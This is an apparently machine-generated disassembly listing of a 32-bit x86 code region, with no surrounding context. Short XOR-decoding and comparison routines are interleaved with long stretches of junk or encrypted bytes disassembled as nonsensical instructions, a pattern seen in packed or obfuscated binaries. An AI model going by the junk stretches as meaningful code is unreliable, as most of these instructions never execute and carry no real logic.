  4049b4:	fdivr  QWORD PTR [ecx-0x3a538e29]
  4049ba:	test   DWORD PTR [esi-0x3d38fb63],0x3c520587
  4049c4:	pushf  
  4049c5:	xlat   BYTE PTR ds:[ebx]
  4049c6:	dec    esp
  4049c7:	jno    0x4049a3
  4049c9:	push   esi
  4049ca:	adc    BYTE PTR [ebp-0xd006320],0x9d
  4049d1:	ret    0x25c1
  4049d4:	cmp    al,0x9
  4049d6:	mov    ebx,0x2f77562c
  4049db:	data16 mov ah,0x89
  4049de:	repnz push edi
  4049e0:	mov    edi,DWORD PTR [ebp+0x8]
  4049e3:	sbb    DWORD PTR ds:0x43379b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x433733,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x4336d3
  404a04:	sbb    DWORD PTR ds:0x433773,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x4337a3,0x433773
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x4337b3,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx-0x77]
  404a70:	mov    ecx,0x2d8464f0
  404a75:	jl     0x404af3
  404a77:	stos   DWORD PTR es:[edi],eax
  404a78:	jg     0x404af6
  404a7a:	jl     0x404acf
  404a7c:	pop    es
  404a7d:	repnz retf 
  404a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a80:	cli    
  404a81:	in     al,dx
  404a82:	iret   
  404a83:	xlat   BYTE PTR ds:[ebx]
  404a84:	test   BYTE PTR [ecx-0x57],dh
  404a87:	lock push es
  404a89:	adc    ebx,DWORD PTR [ebx]
  404a8b:	out    0x7f,eax
  404a8d:	jnp    0xad7601d2
  404a93:	test   esp,edx
  404a95:	sahf   
  404a96:	stos   BYTE PTR es:[edi],al
  404a97:	mov    edi,0x940cb4f4
  404a9c:	pop    esi
  404a9d:	fcmovu st,st(4)
  404a9f:	push   edx
  404aa0:	in     al,dx
  404aa1:	(bad)  
  404aa2:	std    
  404aa3:	jb     0x404a75
  404aa5:	cmp    BYTE PTR [esi-0x2f9555c7],bl
  404aab:	adc    BYTE PTR [esi-0xe6eea9e],dh
  404ab1:	clc    
  404ab2:	adc    DWORD PTR [ebp+0x2b],ebp
  404ab5:	aaa    
  404ab6:	sbb    DWORD PTR [eax+0x7e],0xffffffae
  404aba:	lahf   
  404abb:	stos   BYTE PTR es:[edi],al
  404abc:	(bad)  
  404abd:	fld    DWORD PTR [edi+0x62f631ce]
  404ac3:	cmp    eax,0x2fb47661
  404ac8:	push   ds
  404ac9:	das    
  404aca:	je     0x404a70
  404acc:	mov    DWORD PTR [ebx-0x541666c6],esi
  404ad2:	dec    ecx
  404ad3:	push   0x7a71810e
  404ad8:	and    eax,esp
  404ada:	in     eax,dx
  404adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404adc:	cdq    
  404add:	(bad)  
  404ade:	jmp    0x404b44
  404ae0:	pop    edx
  404ae1:	clc    
  404ae2:	rep ins DWORD PTR es:[edi],dx
  404ae4:	jecxz  0x404a6d
  404ae6:	jmp    0x404b20
  404ae8:	inc    edi
  404ae9:	fistp  QWORD PTR [eax+0x7d]
  404aec:	scas   eax,DWORD PTR es:[edi]
  404aed:	out    0x4b,eax
  404aef:	dec    edi
  404af0:	push   ss
  404af1:	sbb    dh,ch
  404af3:	pop    ss
  404af4:	fidivr WORD PTR [edi-0x3776f133]
  404afa:	out    0xe6,al
  404afc:	ret    0x24ab
  404aff:	sbb    BYTE PTR [esi],cl
  404b01:	mov    ds:0x3f2c5097,al
  404b06:	push   ebx
  404b07:	inc    esi
  404b08:	xchg   esp,eax
  404b09:	sub    ebx,DWORD PTR ds:0x15c1d43c
  404b0f:	mov    al,0x88
  404b11:	add    eax,0xcd94a0a0
  404b16:	lock push eax
  404b18:	mov    DWORD PTR cs:[edi+0x49],ebx
  404b1c:	out    dx,al
  404b1d:	sub    al,0x3a
  404b1f:	pop    esp
  404b20:	(bad)  
  404b21:	rcr    dh,0x72
  404b24:	sti    
  404b25:	jnp    0x404ba3
  404b27:	ret    
  404b28:	inc    edi
  404b29:	jae    0x404b5b
  404b2b:	ficomp WORD PTR [ecx-0x7bbc727f]
  404b31:	dec    ebx
  404b32:	popf   
  404b33:	jno    0x404b9c
  404b35:	mov    eax,ds:0xa89a7c49
  404b3a:	jl     0x404b7c
  404b3c:	mov    esi,DWORD PTR [edx-0x6672716e]
  404b42:	mov    bh,0x13
  404b44:	outs   dx,DWORD PTR ds:[esi]
  404b45:	cdq    
  404b46:	int3   
  404b47:	cdq    
  404b48:	xchg   edi,eax
  404b49:	sub    al,0x42
  404b4b:	mov    al,0x2f
  404b4d:	add    edi,ecx
  404b4f:	pop    ebp
  404b50:	imul   edi,DWORD PTR [ebp+edx*2-0x412f876e],0x65280b0e
  404b5b:	fs inc ebp
  404b5d:	and    al,0x7b
  404b5f:	pushf  
  404b60:	pop    ss
  404b61:	sub    al,0x73
  404b63:	dec    ecx
  404b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b65:	cmp    DWORD PTR [ebx],ebp
  404b67:	loopne 0x404b72
  404b69:	inc    ecx
  404b6a:	sbb    DWORD PTR [esi-0x32cf8b74],edx
  404b70:	mov    ebx,0x8523cee5
  404b75:	dec    ecx
  404b76:	dec    ebx
  404b77:	sbb    eax,0xade850f1
  404b7c:	pop    ecx
  404b7d:	mov    edx,0x93c13603
  404b82:	loopne 0x404b9b
  404b84:	cmp    ah,dl
  404b86:	mov    al,ds:0xa4ed6cc4
  404b8b:	push   edi
  404b8c:	call   0x225d8d75
  404b91:	jb     0x404b80
  404b93:	leave  
  404b94:	sub    cl,BYTE PTR [ebx-0x7f]
  404b97:	adc    BYTE PTR [ecx],ch
  404b99:	or     al,0x75
  404b9b:	inc    esp
  404b9c:	loopne 0x404b8f
  404b9e:	dec    ecx
  404b9f:	mov    ah,BYTE PTR [edi]
  404ba1:	push   edx
  404ba2:	mov    BYTE PTR [ecx],ch
  404ba4:	add    eax,0x421e1abd
  404ba9:	fsubr  QWORD PTR [esi-0x74]
  404bac:	and    BYTE PTR [esi+ebx*8+0x59],ah
  404bb0:	mov    dh,0x93
  404bb2:	inc    BYTE PTR [ebx-0x7a]
  404bb5:	cmp    esi,0xffffff8b
  404bb8:	and    ecx,DWORD PTR [edx-0x3d]
  404bbb:	pop    ss
  404bbc:	icebp  
  404bbd:	pop    esp
  404bbe:	add    DWORD PTR [ebx+esi*1],eax
  404bc1:	fild   QWORD PTR [ecx-0x3602b208]
  404bc7:	loopne 0x404bef
  404bc9:	cmp    al,0x4c
  404bcb:	ret    0x9454
  404bce:	mov    WORD PTR [esi],ds
  404bd0:	inc    DWORD PTR [esp+ecx*1-0x5fdf9093]
  404bd7:	adc    DWORD PTR [ebx+0x7993c088],esi
  404bdd:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  404bdf:	inc    edi
  404be0:	sahf   
  404be1:	inc    ebp
  404be2:	jo     0x404bf5
  404be4:	pop    ebx
  404be5:	jmp    0x404b7b
  404be7:	add    ebx,0x2e9cde2c
  404bed:	adc    BYTE PTR [edi-0x4d],dl
  404bf0:	mov    ?,ebx
  404bf2:	into   
  404bf3:	bound  ebx,QWORD PTR [ebp-0xf]
  404bf6:	out    0x7,al
  404bf8:	xchg   ebp,eax
  404bf9:	xlat   BYTE PTR ds:[ebx]
  404bfa:	stos   BYTE PTR es:[edi],al
  404bfb:	out    0x74,eax
  404bfd:	mov    cl,0xfe
  404bff:	mov    eax,0x2a48a587
  404c04:	inc    esp
  404c05:	xor    BYTE PTR [ebx],0x89
  404c08:	int    0xc2
  404c0a:	pusha  
  404c0b:	jmp    0x404bfa
  404c0d:	dec    esp
  404c0e:	or     edi,ecx
  404c10:	push   eax
  404c11:	sar    DWORD PTR ds:0x6a9c3ef5,1
  404c17:	pop    esp
  404c18:	lds    esi,FWORD PTR [ebx]
  404c1a:	sub    ebx,DWORD PTR [esi+0x43]
  404c1d:	and    al,0xdc
  404c1f:	add    DWORD PTR [eax-0x6b],0xffffffb1
  404c23:	ins    DWORD PTR es:[edi],dx
  404c24:	shl    BYTE PTR [ebp-0x6c],0x11
  404c28:	mov    bh,0xe2
  404c2a:	sub    DWORD PTR [edi],edx
  404c2c:	leave  
  404c2d:	and    DWORD PTR [esp+eiz*8+0x33],ebx
  404c31:	rol    DWORD PTR [ebx],0xc6
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	sbb    eax,0x33771f0a
  404c62:	das    
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404ce1
  404c6a:	mov    ch,0x82
  404c6c:	add    cl,bl
  404c6e:	imul   ecx,DWORD PTR [ebx-0x43079cec],0xffffffdc
  404c75:	sbb    BYTE PTR [ebx-0x6a],al
  404c78:	das    
  404c79:	into   
  404c7a:	ins    DWORD PTR es:[edi],dx
  404c7b:	(bad)  
  404c7c:	ss push ss
  404c7e:	add    DWORD PTR [edi-0x2380fce3],eax
  404c84:	enter  0xf06d,0xea
  404c88:	xlat   BYTE PTR ds:[ebx]
  404c89:	cmp    BYTE PTR [edx+0x5f],bl
  404c8c:	sahf   
  404c8d:	cld    
  404c8e:	cdq    
  404c8f:	mov    WORD PTR [edi+0x26],?
  404c92:	pop    esp
  404c93:	pop    esi
  404c94:	jl     0x404d09
  404c96:	add    BYTE PTR [eax],bh
  404c98:	xchg   ebp,eax
  404c99:	pop    edi
  404c9a:	mov    DWORD PTR [edx-0x7dd89559],ebx
  404ca0:	jne    0x404d04
  404ca2:	js     0x404cb5
  404ca4:	sub    BYTE PTR [edx+0x29930ae0],0xd4
  404cab:	cdq    
  404cac:	dec    edi
  404cad:	imul   edx,DWORD PTR [ecx-0x5f],0xffffffb0
  404cb1:	inc    edx
  404cb2:	dec    ebp
  404cb3:	jmp    0x8a22f7fb
  404cb8:	aad    0xaa
  404cba:	push   ebp
  404cbb:	pop    DWORD PTR [edx+ebx*2-0xc11cca5]
  404cc2:	xor    dl,BYTE PTR [edi+0x76]
  404cc5:	sar    BYTE PTR [edi],cl
  404cc7:	repnz and cl,BYTE PTR [edi]
  404cca:	shr    DWORD PTR [ebp+eax*4+0x363b2a46],cl
  404cd1:	mov    ebp,0x346e5503
  404cd6:	push   esi
  404cd7:	push   0xffffffa4
  404cd9:	iret   
  404cda:	inc    ebx
  404cdb:	neg    BYTE PTR [ecx+0x134cadb1]
  404ce1:	pop    edx
  404ce2:	xor    dl,cl
  404ce4:	outs   dx,DWORD PTR ds:[esi]
  404ce5:	inc    ebp
  404ce6:	and    al,bl
  404ce8:	(bad)  
  404ce9:	stc    
  404cea:	and    BYTE PTR [eax+0x2d],al
  404ced:	push   0x15
  404cef:	mov    ch,0x58
  404cf1:	lock popf 
  404cf3:	mov    WORD PTR [ebx],fs
  404cf5:	pop    esi
  404cf6:	(bad)  
  404cf7:	xchg   edi,eax
  404cf8:	aas    
  404cf9:	ret    0x41d0
  404cfc:	ss pushf 
  404cfe:	mov    eax,0xcb93d3d4
  404d03:	loope  0x404d52
  404d05:	pop    edx
  404d06:	push   edi
  404d07:	ins    BYTE PTR es:[edi],dx
  404d08:	std    
  404d09:	fst    st(4)
  404d0b:	loop   0x404d48
  404d0d:	int    0xd7
  404d0f:	retf   
  404d10:	sub    DWORD PTR [eax+0x7e],0xca757a7d
  404d17:	dec    ebp
  404d18:	(bad)  
  404d19:	jle    0x404d60
  404d1b:	mov    ah,0xea
  404d1d:	fs aam 0xb6
  404d20:	call   0xc58a:0x8c5c5848
  404d27:	pop    ebp
  404d28:	inc    esp
  404d29:	pop    esp
  404d2a:	and    eax,esp
  404d2c:	or     edi,DWORD PTR [eax+ebp*8-0x3]
  404d30:	xchg   ebp,eax
  404d31:	push   edi
  404d32:	adc    DWORD PTR [edx+0x12],esp
  404d35:	xlat   BYTE PTR ds:[ebx]
  404d36:	out    dx,eax
  404d37:	sub    al,0x76
  404d39:	leave  
  404d3a:	mov    ?,WORD PTR [edx]
  404d3c:	std    
  404d3d:	mov    dl,0xac
  404d3f:	(bad)  
  404d40:	pop    ss
  404d41:	cli    
  404d42:	xor    edi,edi
  404d44:	cs mov dl,0xb4
  404d47:	(bad)  
  404d49:	and    dh,BYTE PTR [ebp-0x44]
  404d4c:	jle    0x404d81
  404d4e:	pop    eax
  404d4f:	stc    
  404d50:	mov    bl,0xf7
  404d52:	pop    eax
  404d53:	pop    edx
  404d54:	in     eax,0x3
  404d56:	outs   dx,BYTE PTR ds:[esi]
  404d57:	outs   dx,BYTE PTR ds:[esi]
  404d58:	(bad)  
  404d59:	rcr    DWORD PTR [eax],cl
  404d5b:	pop    esi
  404d5c:	mov    bh,0x36
  404d5e:	inc    ecx
  404d5f:	std    
  404d60:	or     al,0xaf
  404d62:	je     0x404dcc
  404d64:	ins    BYTE PTR es:[edi],dx
  404d65:	imul   edx,DWORD PTR [ebx+0x42],0x561cf123
  404d6c:	test   DWORD PTR [ebx-0x7e802622],0x9796895d
  404d76:	push   ss
  404d77:	add    BYTE PTR [esi+0x2bc7df66],ah
  404d7d:	aas    
  404d7e:	xor    BYTE PTR [edi-0x3],dl
  404d81:	shl    WORD PTR [edi-0x2370285d],0x2b
  404d89:	mov    BYTE PTR [ebx],cl
  404d8b:	int    0xc8
  404d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d8e:	mov    ebp,0xff2bc974
  404d93:	clc    
  404d94:	lods   al,BYTE PTR ds:[esi]
  404d95:	mov    eax,0xb0d989fb
  404d9a:	outs   dx,BYTE PTR ds:[esi]
  404d9b:	arpl   WORD PTR [ebp-0x5f],bp
  404d9e:	cli    
  404d9f:	test   al,0x7d
  404da1:	push   ecx
  404da2:	rcr    BYTE PTR [ebp-0x3c6f2a89],1
  404da8:	mov    eax,0x9ab9dbb
  404dad:	adc    DWORD PTR [esp+eiz*8-0x7d43d544],edi
  404db4:	jno    0x404dd1
  404db6:	inc    edx
  404db7:	push   edi
  404db8:	adc    edi,edx
  404dba:	in     eax,0x84
  404dbc:	scas   al,BYTE PTR es:[edi]
  404dbd:	(bad)  
  404dbe:	lock xchg ecx,eax
  404dc0:	push   ebp
  404dc1:	mov    eax,ds:0x2f7be228
  404dc6:	adc    edx,DWORD PTR [ebx-0x2f]
  404dc9:	xchg   esp,eax
  404dca:	loop   0x404d59
  404dcc:	and    eax,0x28b6e40e
  404dd1:	fisub  DWORD PTR [edx]
  404dd3:	push   ds
  404dd4:	cmp    DWORD PTR [ebp+esi*4+0x907aff3],eax
  404ddb:	out    dx,al
  404ddc:	lahf   
  404ddd:	push   edx
  404dde:	push   0x1db9221a
  404de3:	mov    al,ds:0x98684931
  404de8:	adc    DWORD PTR [edx+0x3d5dd7f3],esp
  404dee:	bound  edx,QWORD PTR [ecx+0x62a6b04a]
  404df4:	dec    ebp
  404df5:	mov    bl,0x5c
  404df7:	jbe    0x404d7a
  404df9:	lods   al,BYTE PTR ds:[esi]
  404dfa:	jmp    0xb72252a4
  404dff:	mov    ah,0x4b
  404e01:	out    dx,al
  404e02:	sar    BYTE PTR [ebx-0x4b25585d],cl
  404e08:	cwde   
  404e09:	xchg   esi,eax
  404e0a:	aas    
  404e0b:	inc    edx
  404e0c:	sahf   
  404e0d:	jo     0x404ddf
  404e0f:	(bad)
  404e13:	aaa    
  404e14:	inc    edi
  404e15:	retf   0x9c91
  404e18:	pop    ebx
  404e19:	xor    al,0xe8
  404e1b:	add    eax,0x448aeffc
  404e20:	add    eax,0xc558ba8
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0xb2c593b9
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e4b
  404e56:	sbb    eax,0x98089c48
  404e5b:	aas    
  404e5c:	jg     0x404e69
  404e5e:	jmp    0x67aa:0x392e7428
  404e65:	dec    ecx
  404e66:	jbe    0x404e08
  404e68:	mov    ds:0x4681b3be,eax
  404e6d:	xor    eax,0xf86b707
  404e72:	jp     0x404df9
  404e74:	out    0xf7,eax
  404e76:	jmp    0x404e30
  404e78:	dec    edi
  404e79:	cli    
  404e7a:	push   edi
  404e7b:	add    eax,0x66bca1b7
  404e80:	mov    edx,0xdde790bd
  404e85:	push   eax
  404e86:	outs   dx,BYTE PTR ds:[esi]
  404e87:	cmp    al,0xe8
  404e89:	test   eax,0x226fdb81
  404e8e:	icebp  
  404e8f:	sbb    ebx,DWORD PTR [ebp-0x74655ff8]
  404e95:	and    al,0xee
  404e97:	xchg   edi,eax
  404e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e99:	sub    cl,dh
  404e9b:	inc    esp
  404e9c:	cli    
  404e9d:	pop    esp
  404e9e:	jno    0x404e6b
  404ea0:	fwait
  404ea1:	lods   al,BYTE PTR ds:[esi]
  404ea2:	fwait
  404ea3:	add    esp,DWORD PTR [edi-0x3e]
  404ea6:	jne    0x404eca
  404ea8:	lea    ebx,[ecx]
  404eaa:	outs   dx,BYTE PTR ds:[esi]
  404eab:	leave  
  404eac:	pushf  
  404ead:	cld    
  404eae:	xor    eax,DWORD PTR fs:[edi]
  404eb1:	lahf   
  404eb2:	fnsave [edx+0x5fda1210]
  404eb8:	(bad)  
  404eb9:	(bad)  
  404ebb:	sbb    eax,0x2e920733
  404ec0:	loopne 0x404f2a
  404ec2:	in     al,dx
  404ec3:	retf   
  404ec4:	cli    
  404ec5:	cli    
  404ec6:	dec    esp
  404ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec8:	push   edi
  404ec9:	into   
  404eca:	imul   esp,DWORD PTR [edx-0x33],0x9bb963a8
  404ed1:	push   ebp
  404ed2:	dec    esi
  404ed3:	test   al,0x9d
  404ed5:	imul   esi,DWORD PTR [ebp-0x4c],0x687c176a
  404edc:	stos   BYTE PTR es:[edi],al
  404edd:	jns    0x404e9f
  404edf:	mov    bl,0x40
  404ee1:	popf   
  404ee2:	adc    eax,0x1f2b05f1
  404ee7:	call   0x41fa4070
  404eec:	inc    esp
  404eed:	push   ebp
  404eee:	je     0x404f5a
  404ef0:	add    eax,0xc1178ad7
  404ef5:	sbb    eax,0x10f8c479
  404efa:	inc    ebx
  404efb:	cli    
  404efc:	inc    esi
  404efd:	pop    esi
  404efe:	icebp  
  404eff:	retf   0xe695
  404f02:	sbb    eax,0xb4751a19
  404f07:	mov    esp,0x713bc2aa
  404f0c:	inc    ebx
  404f0d:	pop    esp
  404f0e:	ds not BYTE PTR es:[edi+0x46]
  404f13:	xchg   esp,eax
  404f14:	inc    edi
  404f15:	xchg   edx,eax
  404f16:	xchg   DWORD PTR [edx+0x71bbdc68],ecx
  404f1c:	leave  
  404f1d:	pop    edx
  404f1e:	xor    eax,DWORD PTR [ecx+0x507c45c4]
  404f24:	mov    bl,0xcc
  404f26:	repz rcl BYTE PTR [eax-0x4b5f90e8],cl
  404f2d:	dec    ebx
  404f2e:	scas   al,BYTE PTR es:[edi]
  404f2f:	xchg   esi,eax
  404f30:	outs   dx,DWORD PTR ds:[esi]
  404f31:	push   cs
  404f32:	mov    ah,0xa5
  404f34:	out    dx,al
  404f35:	sahf   
  404f36:	aaa    
  404f37:	retf   
  404f38:	sub    bh,BYTE PTR [edi]
  404f3a:	shr    BYTE PTR [ebp+0x5cb72add],cl
  404f40:	ret    0xf93d
  404f43:	mov    eax,0xcdb525d6
  404f48:	lods   al,BYTE PTR ds:[esi]
  404f49:	sub    BYTE PTR [edx],ch
  404f4b:	pop    ss
  404f4c:	adc    dh,dh
  404f4e:	mov    edi,0x12aa1a6
  404f53:	nop
  404f54:	push   ebx
  404f55:	jmp    0x404f77
  404f57:	jnp    0x404faf
  404f59:	lock sbb bh,dl
  404f5c:	out    dx,al
  404f5d:	add    esi,0x66f9eedc
  404f63:	cs push esp
  404f65:	lods   al,BYTE PTR ds:[esi]
  404f66:	fst    DWORD PTR [ecx+0xc3cd2fa]
  404f6c:	popf   
  404f6d:	mov    bh,0x1b
  404f6f:	mov    dl,0xb4
  404f71:	int    0x50
  404f73:	push   cs
  404f74:	push   ecx
  404f75:	sub    ch,BYTE PTR [esi-0x7399570f]
  404f7b:	call   0x9f:0x59df980f
  404f82:	jmp    FWORD PTR [ecx+0x153fd52b]
  404f88:	loopne 0x404f63
  404f8a:	imul   BYTE PTR [edx]
  404f8c:	jb     0x404f86
  404f8e:	and    bh,BYTE PTR [ecx]
  404f90:	fistp  WORD PTR [edi-0x17]
  404f93:	xor    BYTE PTR [esi+0xf60fc59],bl
  404f99:	fcmovu st,st(6)
  404f9b:	int    0x21
  404f9d:	adc    al,0xca
  404f9f:	inc    ebp
  404fa0:	add    esi,esi
  404fa2:	jle    0x405007
  404fa4:	push   edi
  404fa5:	pop    es
  404fa6:	(bad)  
  404fa7:	out    0x21,al
  404fa9:	out    dx,eax
  404faa:	test   BYTE PTR [edx],dl
  404fac:	fcom   QWORD PTR [esi+0x27]
  404faf:	cmp    dl,BYTE PTR [ebp+0x3aff4403]
  404fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fb6:	enter  0x892f,0x72
  404fba:	ja     0x405010
  404fbc:	pop    edx
  404fbd:	aas    
  404fbe:	mov    al,0x9
  404fc0:	nop
  404fc1:	mov    bl,0x7
  404fc3:	clc    
  404fc4:	inc    BYTE PTR [esp+eax*8]
  404fc7:	int3   
  404fc8:	mov    esp,0xfcf4bd3f
  404fcd:	sub    esi,DWORD PTR [eax+0x7fed466a]
  404fd3:	ins    DWORD PTR es:[edi],dx
  404fd4:	cli    
  404fd5:	mov    ds:0xe25bd76b,eax
  404fda:	add    bl,BYTE PTR [ecx+edi*1+0x71a4a60e]
  404fe1:	cmp    cl,BYTE PTR es:[edx+ebx*1+0x66747e67]
  404fe9:	sbb    al,0x6b
  404feb:	popa   
  404fec:	sbb    eax,0xdc780fd2
  404ff1:	shl    DWORD PTR [esi-0x33],0xd
  404ff5:	inc    eax
  404ff6:	fs enter 0xc401,0x42
  404ffb:	mov    edi,0x5f1f15c
  405001:	rol    DWORD PTR [ebx],cl
  405003:	(bad)  
  405004:	add    al,0x2e
  405006:	pop    ds
  405007:	cmp    al,ah
  405009:	cdq    
  40500a:	add    eax,esi
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	add    DWORD PTR [ebp+0x11],esi
  405046:	scas   eax,DWORD PTR es:[edi]
  405047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405048:	sub    BYTE PTR [esp+edi*2-0x55],bh
  40504c:	jg     0x4050ca
  40504e:	jl     0x40504b
  405050:	ror    DWORD PTR [ebx],cl
  405052:	fidiv  WORD PTR [eax-0x6981a98c]
  405058:	or     al,0x19
  40505a:	ror    ah,1
  40505c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40505d:	xor    al,0xd5
  40505f:	mov    edi,0x8551f36
  405064:	cld    
  405065:	or     eax,0xdc651b12
  40506a:	sub    eax,0x21ee440e
  40506f:	mov    cl,0x7a
  405071:	ins    BYTE PTR es:[edi],dx
  405072:	adc    eax,0xce9adc60
  405077:	(bad)  
  405078:	xor    al,0x69
  40507a:	push   eax
  40507b:	aas    
  40507c:	in     al,dx
  40507d:	adc    al,0x21
  40507f:	loop   0x405032
  405081:	arpl   WORD PTR [esi-0xa],dx
  405084:	or     ecx,edi
  405086:	mov    esp,0xd6b2352
  40508b:	bnd jge 0x40508b
  40508e:	mov    dl,0xfd
  405090:	mov    ch,BYTE PTR [esp+ebx*2]
  405093:	xchg   BYTE PTR [edx-0x41053e30],bh
  405099:	pusha  
  40509a:	pop    ss
  40509b:	pushf  
  40509c:	inc    esp
  40509d:	sub    ah,BYTE PTR [edx-0x5371e250]
  4050a3:	xor    edi,DWORD PTR [eax+0x4]
  4050a6:	mov    bh,BYTE PTR [eax-0x4c0b2241]
  4050ac:	jge    0x405091
  4050ae:	mov    ebp,DWORD PTR [edx]
  4050b0:	retf   
  4050b1:	(bad)  
  4050b3:	sar    BYTE PTR [edi],0xb4
  4050b6:	idiv   ebp
  4050b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050b9:	popf   
  4050ba:	ins    BYTE PTR es:[edi],dx
  4050bb:	int    0xe3
  4050bd:	in     al,dx
  4050be:	pop    ss
  4050bf:	jge    0x40508d
  4050c1:	mov    eax,ds:0x68178b0e
  4050c6:	add    DWORD PTR [esp+edx*2],esp
  4050c9:	lock call 0x9cc99fe5
  4050cf:	mov    dh,0xdd
  4050d1:	outs   dx,BYTE PTR ds:[esi]
  4050d2:	fstp   QWORD PTR [ecx-0x11f4d5d1]
  4050d8:	out    0xea,eax
  4050da:	inc    edi
  4050db:	mov    DWORD PTR [ecx+0xd],ebp
  4050de:	repz add cl,ch
  4050e1:	push   eax
  4050e2:	add    DWORD PTR [esi+0x46378ae9],0xffffff97
  4050e9:	sbb    edx,DWORD PTR [ecx-0x69d9263e]
  4050ef:	mov    eax,0xbafa7602
  4050f4:	mov    bl,0xd9
  4050f6:	cmp    esp,DWORD PTR [edi]
  4050f8:	jmp    0xe573736d
  4050fd:	dec    edx
  4050fe:	mov    al,0xa7
  405100:	cmp    esi,DWORD PTR [edi+edx*8]
  405103:	test   DWORD PTR [eax+edi*8-0x6244b42f],esp
  40510a:	loop   0x4050d4
  40510c:	sub    DWORD PTR [ebx],esi
  40510e:	pop    ebp
  40510f:	sub    dl,BYTE PTR [ecx+0x11]
  405112:	(bad)
  405115:	je     0x405189
  405117:	sbb    edi,DWORD PTR [ebx]
  405119:	addr16 in eax,dx
  40511b:	out    0xe,eax
  40511d:	mov    bl,0xb8
  40511f:	sahf   
  405120:	pop    esi
  405121:	xchg   DWORD PTR [ebx],esp
  405123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405124:	jb     0x405171
  405126:	cmp    esp,DWORD PTR [ebp+0x182284ef]
  40512c:	cmc    
  40512d:	je     0x405196
  40512f:	call   0xa5a3dc9f
  405134:	sbb    BYTE PTR [ebp+0x4c644118],ch
  40513a:	fiadd  WORD PTR [eax+0x23]
  40513d:	jg     0x4050c6
  40513f:	sub    dl,BYTE PTR [ebx]
  405141:	icebp  
  405142:	rol    DWORD PTR [edx+0x7b],1
  405145:	sti    
  405146:	lods   eax,DWORD PTR ds:[esi]
  405147:	mov    esi,0x1dabea93
  40514c:	dec    esp
  40514d:	es in  al,0x13
  405150:	dec    esp
  405151:	jbe    0x4051a9
  405153:	aad    0x26
  405155:	arpl   WORD PTR [eax+0x53],cx
  405158:	cmp    DWORD PTR [ecx+0x47e4ec7a],edx
  40515e:	sahf   
  40515f:	shl    DWORD PTR [ebx-0x1],0xbe
  405163:	and    DWORD PTR [eax],eax
  405165:	(bad)  
